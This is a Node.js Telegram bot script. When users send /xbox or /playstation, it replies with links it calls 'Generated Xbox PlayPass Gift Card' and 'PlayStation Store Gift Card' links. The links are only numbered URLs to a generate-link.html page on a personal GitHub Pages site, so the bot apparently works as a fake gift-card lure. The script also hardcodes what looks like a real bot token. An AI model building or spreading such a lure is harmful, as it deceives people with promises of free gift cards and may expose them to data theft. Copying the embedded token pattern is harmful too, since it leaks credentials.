const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Load Telegram bot token
const token = '8354499302:AAGjags-HsTkmZZf_EXKpa5kJg9B1wfkjwI';

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// File to store the link counter
const counterFilePath = path.join(__dirname, 'linkCounter.json');

// Function to get the next link number
function getNextLinkNumber() {
    let counter = 0;
    if (fs.existsSync(counterFilePath)) {
        const data = fs.readFileSync(counterFilePath, 'utf8');
        counter = JSON.parse(data).counter;
    }
    counter++;
    fs.writeFileSync(counterFilePath, JSON.stringify({ counter }), 'utf8');
    return counter;
}

// Function to generate a valid link
function generateLink(type) {
    const linkNumber = getNextLinkNumber();
    return `https://DUptain1993.github.io/Botimus_Prime/generate-link.html?link=${linkNumber}&type=${type}`;
}

// Command handler for generating Xbox PlayPass gift card link
bot.onText(/\/xbox/, (msg) => {
    const chatId = msg.chat.id;
    const link = generateLink('xbox');
    bot.sendMessage(chatId, `Generated Xbox PlayPass Gift Card Link: ${link}`);
});

// Command handler for generating PlayStation Store gift card link
bot.onText(/\/playstation/, (msg) => {
    const chatId = msg.chat.id;
    const link = generateLink('playstation');
    bot.sendMessage(chatId, `Generated PlayStation Store Gift Card Link: ${link}`);
});

// Endpoint to receive data and forward to Telegram
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!chatId || !text) {
        return;
    }

    const telegramBotToken = token;
    const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    axios.post(apiUrl, {
        chat_id: chatId,
        text: text
    })
    .then(response => {
        console.log('Message sent to Telegram:', response.data);
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
    });
});
